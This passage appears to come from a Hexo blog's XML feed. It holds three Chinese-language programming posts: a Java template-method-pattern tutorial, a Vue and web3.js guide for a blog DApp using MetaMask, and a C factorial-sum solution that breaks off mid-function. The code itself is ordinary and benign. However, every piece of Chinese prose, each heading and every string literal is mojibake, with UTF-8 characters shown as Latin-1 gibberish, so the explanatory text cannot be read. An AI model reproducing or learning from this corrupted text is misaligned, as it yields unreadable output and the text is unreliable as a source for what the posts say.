<p>è§‚å¯Ÿä¸Šé¢çš„ä¾‹å­ï¼Œå‘ç°æ¯ä¸€ä¸ªå­¦ç”Ÿæœ‰ç›¸åŒä¹‹å¤„ï¼Œä¹Ÿæœ‰ä¸åŒä¹‹å¤„ï¼Œå¦‚æœæ¯ä¸€ä¸ªå­¦ç”Ÿç±»éƒ½æ˜¯è¿™ä¹ˆå†™ï¼Œå°±ä¼šäº§ç”Ÿå¤§é‡å†—ä½™ä»£ç ï¼Œè€Œä¸”å‡å¦‚æ¯ä¸ªå­¦ç”Ÿè¿”æ ¡åè¿˜è¦å‚åŠ å¼€å­¦å…¸ç¤¼ï¼Œé‚£ä¹ˆè¿˜è¦ä¸ºæ¯ä¸€ä¸ªå­¦ç”Ÿä¸€ä¸ªæ–¹æ³•ï¼Œåœ¨å­¦ç”Ÿç±»éå¸¸å¤šçš„æƒ…å†µä¸‹å·¥ä½œæ˜¯éå¸¸çš„ç¹çã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥å¼•å…¥<strong>æ¨¡æ¿æ–¹æ³•</strong>ã€‚</p>
<h2 id="æ¨¡æ¿æ–¹æ³•"><a href="#æ¨¡æ¿æ–¹æ³•" class="headerlink" title="æ¨¡æ¿æ–¹æ³•"></a>æ¨¡æ¿æ–¹æ³•</h2><p> å®šä¹‰ï¼šå®šä¹‰ä¸€ä¸ªæ“ä½œä¸­çš„ç®—æ³•éª¨æ¶ï¼Œè€Œå°†ç®—æ³•çš„ä¸€äº›æ­¥éª¤å»¶è¿Ÿåˆ°å­ç±»ä¸­ï¼Œä½¿å¾—å­ç±»å¯ä»¥ä¸æ”¹å˜è¯¥ç®—æ³•ç»“æ„çš„æƒ…å†µä¸‹é‡å®šä¹‰è¯¥ç®—æ³•çš„æŸäº›ç‰¹å®šæ­¥éª¤ã€‚å®ƒæ˜¯ä¸€ç§ç±»è¡Œä¸ºå‹æ¨¡å¼ã€‚</p>
<h2 id="é€‚ç”¨åœºæ™¯"><a href="#é€‚ç”¨åœºæ™¯" class="headerlink" title="é€‚ç”¨åœºæ™¯"></a>é€‚ç”¨åœºæ™¯</h2><ul>
<li><p>ç®—æ³•çš„æ•´ä½“æ­¥éª¤å¤§ä½“ä¸Šå›ºå®šï¼Œä¹Ÿå­˜åœ¨ä¸åŒä¹‹å¤„ï¼Œå¯ä»¥å°†ä¸åŒçš„é€»è¾‘ä¸šåŠ¡æŠ½è±¡å‡ºæ¥ï¼Œå­ç±»è¿›è¡Œå®ç°ã€‚ä¾‹å¦‚ä¸Šæ–‡ä¸­çš„â€œæ”¶åˆ°é€šçŸ¥â€ã€â€œè´­ç¥¨â€ã€â€œè¿”æ ¡æŠ¥é“â€</p>
</li>
<li><p>å­ç±»æœ‰å…¬å…±çš„è¡Œä¸ºï¼Œå¯ä»¥æå‡ºåˆ°çˆ¶ç±»ä¸­ï¼Œé¿å…ä»£ç é‡å¤ã€‚</p>
</li>
<li><p>éœ€è¦é€šè¿‡å­ç±»åˆ¤æ–­çˆ¶ç±»ä¸­æŸä¸ªæ­¥éª¤æ˜¯å¦æ‰§è¡Œï¼Œä»è€Œå®ç°å­ç±»å¯¹çˆ¶ç±»çš„åå‘æ§åˆ¶ã€‚</p>
</li>
</ul>
<h2 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h2><h3 id="å®šä¹‰æŠ½è±¡æ¨¡æ¿ç±»"><a href="#å®šä¹‰æŠ½è±¡æ¨¡æ¿ç±»" class="headerlink" title="å®šä¹‰æŠ½è±¡æ¨¡æ¿ç±»"></a>å®šä¹‰æŠ½è±¡æ¨¡æ¿ç±»</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseProcess</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        receiveNotification();</span><br><span class="line">        buyTicket();</span><br><span class="line">        backSchool();</span><br><span class="line">        register();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">backSchool</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">buyTicket</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====æˆ‘è´­ç¥¨å•¦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">receiveNotification</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====æˆ‘æ”¶åˆ°é€šçŸ¥å•¦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====æˆ‘æ³¨å†Œå®Œæ¯•å•¦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å®šä¹‰å®ç°ç±»"><a href="#å®šä¹‰å®ç°ç±»" class="headerlink" title="å®šä¹‰å®ç°ç±»"></a>å®šä¹‰å®ç°ç±»</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StudentA</span> <span class="keyword">extends</span> <span class="title">BaseProcess</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backSchool</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"===æˆ‘é€šè¿‡åé£æœºè¿”æ ¡çš„==="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StudentB</span> <span class="keyword">extends</span> <span class="title">BaseProcess</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backSchool</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"===æˆ‘é€šè¿‡åç«è½¦è¿”æ ¡çš„==="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æµ‹è¯•ç±»"><a href="#æµ‹è¯•ç±»" class="headerlink" title="æµ‹è¯•ç±»"></a>æµ‹è¯•ç±»</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        BaseProcess A = <span class="keyword">new</span> StudentA();</span><br><span class="line">        A.process();</span><br><span class="line">        BaseProcess B = <span class="keyword">new</span> StudentB();</span><br><span class="line">        B.process();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æ¨¡å¼æ‰©å±•"><a href="#æ¨¡å¼æ‰©å±•" class="headerlink" title="æ¨¡å¼æ‰©å±•"></a>æ¨¡å¼æ‰©å±•</h2><p> åœ¨æ¨¡æ¿æ–¹æ³•æ¨¡å¼ä¸­ï¼ŒåŸºæœ¬æ–¹æ³•åŒ…å«ï¼šæŠ½è±¡æ–¹æ³•ã€å…·ä½“æ–¹æ³•å’Œé’©å­æ–¹æ³•ï¼Œæ­£ç¡®ä½¿ç”¨â€œé’©å­æ–¹æ³•â€å¯ä»¥ä½¿å¾—å­ç±»æ§åˆ¶çˆ¶ç±»çš„è¡Œä¸ºã€‚ ä¾‹å¦‚ä¸Šæ–‡ä¸­ï¼Œä¸åŒå­¦ç”Ÿè¿”æ ¡çš„æ—¶å€™å¯èƒ½è¿˜æœ‰å…·ä½“ä¸åŒçš„è¡Œä¸ºï¼Œä¾‹å¦‚å•èº«çš„å­¦ç”Ÿæ˜¯ç›´æ¥è¿›å…¥æ ¡é—¨ç„¶åå›åˆ°å®¿èˆçš„ï¼Œä½†æ˜¯æœ‰ç”·/å¥³æœ‹å‹çš„å­¦ç”Ÿå¯èƒ½è¿›å…¥æ ¡é—¨åç¬¬ä¸€ä»¶äº‹å°±æ˜¯å»è§å¦ä¸€åŠã€‚è¦å®ç°è¯¥é€»è¾‘åªéœ€è¦åœ¨æŠ½è±¡çˆ¶ç±»ä¸­å®šä¹‰æŠ½è±¡é’©å­æ–¹æ³•ï¼Œå­ç±»å®ç°ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseProcess</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        receiveNotification();</span><br><span class="line">        buyTicket();</span><br><span class="line">        backSchool();</span><br><span class="line">        <span class="keyword">if</span> (!isSingle()) &#123;</span><br><span class="line">            SeeCouples();</span><br><span class="line">        &#125;</span><br><span class="line">        register();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">backSchool</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">abstract</span> <span class="keyword">boolean</span> <span class="title">isSingle</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">buyTicket</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====æˆ‘è´­ç¥¨å•¦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">receiveNotification</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====æˆ‘æ”¶åˆ°é€šçŸ¥å•¦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">SeeCouples</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"å¥½ä¹…ä¸è§ï¼Œæˆ‘å¿«è¦æƒ³æ­»ä½ äº†~~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====æˆ‘æ³¨å†Œå®Œæ¯•å•¦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StudentB</span> <span class="keyword">extends</span> <span class="title">BaseProcess</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backSchool</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"===æˆ‘é€šè¿‡åç«è½¦è¿”æ ¡çš„==="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isSingle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ä¸»è¦ç¼ºç‚¹"><a href="#ä¸»è¦ç¼ºç‚¹" class="headerlink" title="ä¸»è¦ç¼ºç‚¹"></a>ä¸»è¦ç¼ºç‚¹</h2><ul>
<li>éœ€è¦ä¸ºæ¯ä¸€ä¸ªåŸºæœ¬æ–¹æ³•çš„ä¸åŒå®ç°æä¾›ä¸€ä¸ªå­ç±» ï¼Œå‡å¦‚çˆ¶ç±»ä¸­å¯å˜çš„åŸºæœ¬æ–¹æ³•å¾ˆå¤šï¼Œé‚£ä¹ˆåŠ¿å¿…é€ æˆå®ç°çš„å­ç±»éå¸¸å¤šï¼ŒåæœŸç»´æŠ¤éš¾åº¦å¢å¤§ã€‚</li>
<li>çˆ¶ç±»ä¸­çš„æŠ½è±¡æ–¹æ³•ç”±å­ç±»å®ç°ï¼Œå­ç±»æ‰§è¡Œçš„ç»“æœä¼šå½±å“çˆ¶ç±»çš„ç»“æœ ï¼Œä¸ä»…å¢åŠ äº†é˜…è¯»éš¾åº¦ï¼Œä¹Ÿ è¿åäº†<a href="https://www.cnblogs.com/jimoer/p/9163426.html#autoid-3-2-0" target="_blank" rel="noopener">é‡Œæ°æ›¿æ¢åŸåˆ™</a>ï¼Œä¼šç»™ç¨‹åºå¸¦æ¥é£é™©ã€‚ </li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>æ¨¡æ¿æ–¹æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title>é“¾åš--DAPPç»ƒæ‰‹é¡¹ç›®ï¼ˆä¸‰ï¼‰</title>
    <url>/2023/01/02/%E9%93%BE%E5%8D%9A%E2%80%94%E2%80%94DAPP%E7%BB%83%E6%89%8B%E9%A1%B9%E7%9B%AE%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    <content><![CDATA[<p>åŸæ–‡å†ç»­ï¼Œä¹¦æ¥ä¸Šå›ã€‚</p>
<p>è¿™ä¸€å›æˆ‘ä»¬ä¸»è¦å®ŒæˆVueé¡¹ç›®å’Œæ™ºèƒ½åˆçº¦äº¤äº’ã€‚å®Œæ•´ä»£ç è¯·å‚è€ƒ<a href="https://github.com/YaleXin/ChainBlog" target="_blank" rel="noopener">ã€é“¾æ¥ã€‘</a><a id="more"></a></p>
<h2 id="é¦–é¡µ"><a href="#é¦–é¡µ" class="headerlink" title="é¦–é¡µ"></a>é¦–é¡µ</h2><p>åœ¨é¦–é¡µä¸»è¦æ˜¯è¯·æ±‚å…¨éƒ¨çš„æ–‡ç« ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Web3 <span class="keyword">from</span> <span class="string">"web3"</span>;</span><br><span class="line"><span class="keyword">import</span> ChainBlogJson <span class="keyword">from</span> <span class="string">"@/build/ChainBlog.json"</span>;</span><br><span class="line"><span class="comment">// ....</span></span><br><span class="line">methods: &#123;</span><br><span class="line">    <span class="comment">// è¯»å– json æ–‡ä»¶ï¼Œåˆ©ç”¨ abi å’Œåœ°å€åˆå§‹åŒ–åˆçº¦</span></span><br><span class="line">    <span class="keyword">async</span> f() &#123;</span><br><span class="line">      <span class="comment">//   var web3 = new Web3(Web3.givenProvider || "ws://localhost:8545");</span></span><br><span class="line">      <span class="keyword">var</span> web3 = <span class="keyword">new</span> Web3(<span class="string">"ws://localhost:7545"</span>);</span><br><span class="line">      <span class="keyword">const</span> networkId = <span class="keyword">await</span> web3.eth.net.getId();</span><br><span class="line">      <span class="keyword">const</span> abi = ChainBlogJson.abi;</span><br><span class="line">      <span class="keyword">const</span> contractAddress = ChainBlogJson.networks[networkId].address;</span><br><span class="line">      <span class="keyword">const</span> contract = <span class="keyword">new</span> web3.eth.Contract(abi, contractAddress);</span><br><span class="line">      <span class="keyword">this</span>.contract = contract;</span><br><span class="line">      <span class="keyword">this</span>.getAllBlog();</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// è°ƒç”¨åˆçº¦ä¸­çš„å‡½æ•°</span></span><br><span class="line">    <span class="keyword">async</span> getAllBlog() &#123;</span><br><span class="line">      <span class="keyword">this</span>.contract.methods</span><br><span class="line">        .getAll()</span><br><span class="line">        .call()</span><br><span class="line">        .then(<span class="function">(<span class="params">blogs</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">this</span>.blogs = blogs;</span><br><span class="line">        &#125;)</span><br><span class="line">        .catch(<span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="built_in">console</span>.log(e);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  mounted() &#123;</span><br><span class="line">    <span class="keyword">this</span>.f();</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<h2 id="æ–°å¢æ–‡ç« é¡µé¢"><a href="#æ–°å¢æ–‡ç« é¡µé¢" class="headerlink" title="æ–°å¢æ–‡ç« é¡µé¢"></a>æ–°å¢æ–‡ç« é¡µé¢</h2><p>åœ¨è¿™ä¸ªé¡µé¢ä¸­ï¼Œæˆ‘ä»¬è¦è·å–<code>MetaMask</code>ä¸­æ´»è·ƒçš„è´¦æˆ·ï¼Œå³æ­£åœ¨ä½¿ç”¨çš„è´¦æˆ·ï¼Œç„¶åè¿æ¥æ™ºèƒ½åˆçº¦ï¼Œè°ƒç”¨æ™ºèƒ½åˆçº¦ï¼Œæµç¨‹è¿˜æ˜¯å·®ä¸å¤šï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">submit() &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.content == <span class="string">""</span> || <span class="keyword">this</span>.title == <span class="string">""</span>)</span><br><span class="line">    alert(<span class="string">"Content and title can't be empty!"</span>);</span><br><span class="line">  <span class="comment">// è·å– metamask ä¸­å¯åŠ¨çš„è´¦å·</span></span><br><span class="line">  <span class="built_in">window</span>.ethereum</span><br><span class="line">    .enable()</span><br><span class="line">    .then(<span class="function">(<span class="params">accounts</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.contract.methods</span><br><span class="line">        .addBlog(<span class="keyword">this</span>.title, <span class="keyword">this</span>.summary, <span class="keyword">this</span>.content)</span><br><span class="line">        .send(&#123;</span><br><span class="line">          <span class="comment">// åˆ©ç”¨æˆæƒçš„ç¬¬ä¸€ä¸ªï¼Œå³æ­£åœ¨æ´»è·ƒçš„è´¦å·è¿›è¡Œæäº¤æ–‡ç« </span></span><br><span class="line">          <span class="keyword">from</span>: accounts[<span class="number">0</span>],</span><br><span class="line">          gas: <span class="number">3000000</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">        .then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">          alert(<span class="string">"å‘è¡¨æˆåŠŸ"</span>);</span><br><span class="line">          <span class="keyword">this</span>.$router.push(&#123; <span class="attr">name</span>: <span class="string">"home"</span> &#125;);</span><br><span class="line">        &#125;)</span><br><span class="line">        .catch(<span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="built_in">console</span>.log(e);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .catch(<span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(e);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p><strong>æ³¨æ„ï¼æˆ‘ä»¬è¿™é‡Œä½¿ç”¨<code>send</code>å‡½æ•°è€Œä¸æ˜¯<code>call</code>å‡½æ•°ï¼Œå› ä¸ºåè€…æ²¡æ³•æ›´æ–°çŠ¶æ€</strong></p>
<h2 id="æ–‡ç« è¯¦æƒ…é¡µé¢"><a href="#æ–‡ç« è¯¦æƒ…é¡µé¢" class="headerlink" title="æ–‡ç« è¯¦æƒ…é¡µé¢"></a>æ–‡ç« è¯¦æƒ…é¡µé¢</h2><p>è¿™é‡Œæœ‰ä¸€ç‚¹è¦æ³¨æ„ï¼Œå¦‚æœè¯¥æ–‡ç« çš„ä½œè€…ä¸æ­£åœ¨ç™»å½•çš„ä¸€è‡´ï¼Œæˆ‘ä»¬ç»™äºˆåˆ é™¤å’Œä¿®æ”¹çš„æƒé™</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- åªæœ‰æ–‡ç« æ‰€æœ‰è€…æ‰æœ‰æƒåˆ é™¤å’Œä¿®æ”¹ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">"is_owner"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"delete_btn"</span> <span class="attr">v-on:click</span>=<span class="string">"deleteClick"</span>&gt;</span>åˆ é™¤<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"modify_btn"</span> <span class="attr">v-on:click</span>=<span class="string">"modifyClick"</span>&gt;</span>ä¿®æ”¹<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ....... --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// .......</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">// æ£€æŸ¥è¯¥æ–‡ç« æ˜¯ä¸æ˜¯å½“å‰ metamask ä¸­æ´»è·ƒçš„è´¦æˆ·æ‰€å†™çš„</span></span></span><br><span class="line">    checkOwner() &#123;</span><br><span class="line"><span class="javascript">      <span class="built_in">window</span>.ethereum</span></span><br><span class="line">        .enable()</span><br><span class="line"><span class="javascript">        .then(<span class="function">(<span class="params">accounts</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">if</span> (accounts[<span class="number">0</span>].toLowerCase() == <span class="keyword">this</span>.blog.author.toLowerCase()) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">this</span>.is_owner = <span class="literal">true</span>;</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line"><span class="javascript">        .catch(<span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">          <span class="built_in">console</span>.log(e);</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="ä¿®æ”¹æ–‡ç« é¡µé¢"><a href="#ä¿®æ”¹æ–‡ç« é¡µé¢" class="headerlink" title="ä¿®æ”¹æ–‡ç« é¡µé¢"></a>ä¿®æ”¹æ–‡ç« é¡µé¢</h2><p>è¿™é‡Œå’Œæ–°å¢æ–‡ç« é¡µé¢å·®ä¸å¤šï¼Œåªä¸è¿‡è¦å…ˆè¯·æ±‚æ—§çš„æ–‡ç« å¡«å……è¡¨å•ï¼Œç„¶åå†æç¤ºç”¨æˆ·ä¿®æ”¹ã€‚</p>
<hr>
<h2 id="åè¯"><a href="#åè¯" class="headerlink" title="åè¯"></a>åè¯</h2><p>==æ­¤é¡¹ç›®ä»…ç”¨äºå­¦ä¹ ï¼Œè¯·å‹¿ç”¨äºå…¶ä»–è¿åé“å¾·å’Œæ³•å¾‹çš„äº‹é¡¹ï¼==</p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p>ã€1ã€‘ChainBlogï¼ˆæœ¬é¡¹ç›®å®Œæ•´æºç ï¼‰.<a href="https://github.com/YaleXin/ChainBlog" target="_blank" rel="noopener">https://github.com/YaleXin/ChainBlog</a></p>
<p>ã€2ã€‘web3.jsä¸­æ–‡æ–‡æ¡£.<a href="https://learnblockchain.cn/docs/web3.js/" target="_blank" rel="noopener">https://learnblockchain.cn/docs/web3.js/</a></p>
<p>ã€3ã€‘Solidityä¸­æ–‡æ–‡æ¡£.<a href="https://learnblockchain.cn/docs/solidity/" target="_blank" rel="noopener">https://learnblockchain.cn/docs/solidity/</a></p>
<p>ã€4ã€‘truffleæ–‡æ¡£.<a href="https://learnblockchain.cn/docs/truffle/getting-started/running-migrations.html" target="_blank" rel="noopener">https://learnblockchain.cn/docs/truffle/getting-started/running-migrations.html</a></p>
<p>ã€5ã€‘å¼€å‘ã€éƒ¨ç½²ç¬¬ä¸€ä¸ªDApp.<a href="https://learnblockchain.cn/2018/01/12/first-dapp/" target="_blank" rel="noopener">https://learnblockchain.cn/2018/01/12/first-dapp/</a></p>
<p>ã€6ã€‘DAppæ•™ç¨‹ï¼šç”¨Truffle å¼€å‘ä¸€ä¸ªé“¾ä¸Šè®°äº‹æœ¬.<a href="https://learnblockchain.cn/2019/03/30/dapp_noteOnChain/" target="_blank" rel="noopener">https://learnblockchain.cn/2019/03/30/dapp_noteOnChain/</a></p>
<p>ã€7ã€‘Vue.js <a href="https://cn.vuejs.org/" target="_blank" rel="noopener">https://cn.vuejs.org/</a></p>
]]></content>
      <categories>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>Solidity</tag>
        <tag>Web3.0</tag>
      </tags>
  </entry>
  <entry>
    <title>é˜¶ä¹˜æ±‚å’Œ</title>
    <url>/2020/05/22/%E9%98%B6%E4%B9%98%E6%B1%82%E5%92%8C/</url>
    <content><![CDATA[<blockquote>
<p>é¢˜ç›®æ¥æºï¼š<a href="https://www.dotcpp.com/oj/problem1014.html" target="_blank" rel="noopener">Cè¯­è¨€ç½‘1014</a></p>
</blockquote>
<h2 id="é—®é¢˜æè¿°"><a href="#é—®é¢˜æè¿°" class="headerlink" title="é—®é¢˜æè¿°"></a>é—®é¢˜æè¿°</h2><p> æ±‚Sn=1!+2!+3!+4!+5!+â€¦+n!ä¹‹å€¼ï¼Œå…¶ä¸­næ˜¯ä¸€ä¸ªæ•°å­—(nä¸è¶…è¿‡20)ã€‚ </p>
<h3 id="æ ·ä¾‹è¾“å…¥"><a href="#æ ·ä¾‹è¾“å…¥" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5</span><br></pre></td></tr></table></figure>

<h3 id="æ ·ä¾‹è¾“å‡º"><a href="#æ ·ä¾‹è¾“å‡º" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h3><a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">153</span><br></pre></td></tr></table></figure>

<h2 id="é—®é¢˜æ±‚è§£"><a href="#é—®é¢˜æ±‚è§£" class="headerlink" title="é—®é¢˜æ±‚è§£"></a>é—®é¢˜æ±‚è§£</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-05-22 20:40:31</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-05-22 22:19:56</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\dotcpp\1014.c</span></span><br><span class="line"><span class="comment"> * @ç¥ˆç¥·ä¸å‡ºç°BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_NUM 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">factorial</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> factorial[<span class="number">100</span>];</span><br><span class="line">&#125; f;</span><br><span class="line">f num[<span class="number">25</span>];</span><br><span class="line"><span class="keyword">int</span> ans[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">// é«˜ç²¾åº¦å­˜å‚¨</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setNum</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (index == <span class="number">1</span>) &#123;</span><br><span class="line">        num[<span class="number">1</span>].factorial[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> c = <span class="number">0</span>, mul = <span class="number">0</span>, i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>;; i++) &#123;</span><br><span class="line">            mul = (num[index - <span class="number">1</span>].factorial[i] * index + c) % MAX_NUM;</span><br><span class="line">            c = (num[index - <span class="number">1</span>].factorial[i] * index + c) / MAX_NUM;</span><br><span class="line">            num[index].factorial[i] = mul;</span><br><span class="line">            <span class="keyword">if</span> ((mul + c + num[index - <span class="number">1</span>].factorial[i + <span class="number">1</span>]) == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addAns</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c = <span class="number">0</span>, i, sum = <span 